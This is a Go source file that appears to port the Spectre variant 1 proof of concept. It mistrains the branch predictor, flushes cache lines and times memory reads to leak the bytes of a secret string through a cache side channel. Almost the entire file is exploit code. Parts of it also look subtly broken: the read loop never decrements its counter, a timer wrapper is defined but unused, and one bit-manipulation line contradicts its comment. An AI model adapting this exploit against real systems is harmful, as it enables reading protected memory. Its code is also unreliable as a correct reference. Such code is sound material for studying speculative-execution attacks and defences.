package main

// #cgo CFLAGS: -O0 -march=native  -std=c99 -lc -D_POSIX_C_SOURCE=199309L
// #include <stdint.h>
// #include <x86intrin.h> /* for rdtscp and clflush */
// #include <time.h>
// static inline uint64_t mytime(int *foo) {
//  struct timespec ts;
//  clock_gettime(CLOCK_REALTIME, &ts);
//  register uint64_t t = (ts.tv_sec * 10000 + ts.tv_nsec);
//  return t;
// }
// #define __rdtscp(t) mytime(t)
// static inline void __wrapper_mm_clflush( const void *__p) {
//   _mm_clflush(__p);
// }
import "C"
import (
	"fmt"
	"unsafe"
)

/********************************************************************
Victim code.
********************************************************************/
var array1_size uint = 16
var unused1 = [64]uint8{}
var array1 = [160]uint8{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
var unused2 = [64]uint8{}
var array2 = [256 * 512]uint8{}

var secret = []byte("The Magic Words are Squeamish Ossifrage.")

var temp uint8 = 0 /* Used so compiler won’t optimize out victim_function() */

func victim_function(x uint) {
	if x < array1_size {
		temp &= uint8(array2[uint(array1[x])*512])
	}
}

/********************************************************************
Analysis code
********************************************************************/
const CACHE_HIT_THRESHOLD = 300 /* assume cache hit if time <= threshold 300 400?*/

/* Report best guess in value[0] and runner-up in value[1] */
func readMemoryByte(malicious_x uint, value []uint8, score []int) {
	results := [256]int{}
	var j, k, mix_i int
	var junk = 0
	var training_x, x uint
	var time1, time2 C.ulonglong //register
	var addr *uint8

	for tries := 999; tries > 0; tries-- {

		/* Flush array2[256*(0..255)] from cache */
		for i := 0; i < 256; i++ {
			C.__wrapper_mm_clflush(unsafe.Pointer(&(array2[i*512]))) /* intrinsic for clflush instruction */
		}

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = uint(tries) % array1_size
		for j = 29; j > 0; j-- {
			C.__wrapper_mm_clflush(unsafe.Pointer(&(array1_size)))

			for z := 0; z < 100; z++ {
				/* Delay (can also mfence) */
			}

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = uint(((j % 6) - 1) & (0xFFFF ^ 0)) /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = uint((x | (x >> 16)))              /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x))

			/* Call the victim! */
			victim_function(x)

		}

		/* Tme reads. Order is lightly mixed up to prevent stride prediction */
		for i := 0; i < 256; i++ {
			mix_i = ((i * 167) + 13) & 255
			addr = &array2[mix_i*512]
			//junk_pointer := (*C.uint)(unsafe.Pointer(&(junk)))
			time1 = C.__rdtsc()         /* READ TIMER */
			junk = int(*addr)                        /* MEMORY ACCESS TO TIME */
			time2 = C.__rdtsc() - time1 /* READ TIMER & COMPUTE ELAPSED TIME */
			if time2 <= CACHE_HIT_THRESHOLD && uint8(mix_i) != array1[uint(tries)%array1_size] {
				results[mix_i]++ /* cache hit - add +1 to score for this value */
			}
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = -1
		k = -1
		for i := 0; i < 256; i++ {
			if j < 0 || results[i] >= results[j] {
				k = j
				j = i
			} else if k < 0 || results[i] >= results[k] {
				k = i
			}
		}
		if (results[j] >= (2*results[k]+5) || (results[j] == 2 && results[k] == 0)) {
			break /* Clear success if best is > 2*runner-up + 5 or 2/0) */
		}

	}
	results[0] ^= int(junk) /* use junk so code above won’t get optimized out*/
	value[0] = uint8(j)
	score[0] = results[j]
	value[1] = uint8(k)
	score[1] = results[k]
}

func main() {
	malicious_x := uint(uintptr(unsafe.Pointer(&([]byte(secret)[0]))) - uintptr(unsafe.Pointer(&array1[0])))
	for i := range array2 {
		array2[i] = 1
	}

	var score = []int{0,0}
	var value = []uint8{0,0}
	len := len(secret)

	for i := 0; i < 131072; i++ {
		array2[i] = 1 /* write to array2 so in RAM not copy-on-write zero pages */
	}

	//if (argc == 3) {
	//	C.sscanf(argv[1], "%p", malicious_x)
	//	malicious_x -= 160 /* Convert input value into a pointer */
	//	C.sscanf(argv[2], "%d", & len)
	//}

	var temp string

	fmt.Printf("Reading %d bytes:\n", len)
	for len-1 >= 0 {
		fmt.Printf("Reading at malicious_x = %x...", malicious_x)
		readMemoryByte(malicious_x, value, score)
		malicious_x++

		if score[0] >= 2*score[1] {
			temp = "Success"
		} else {
			temp = "Unclear"
		}
		fmt.Printf("%s: ", temp)

		/* Best Print in screen */
		//if value[0] > 31 && value[0] < 127 {
		//	temp = string(value[0])
		//} else {
		//	temp = "?"
		//}

		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], string(value[0]), score[0])

		if score[1] > 0 {
			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
		}
		fmt.Printf("\n")
	}
	return
}
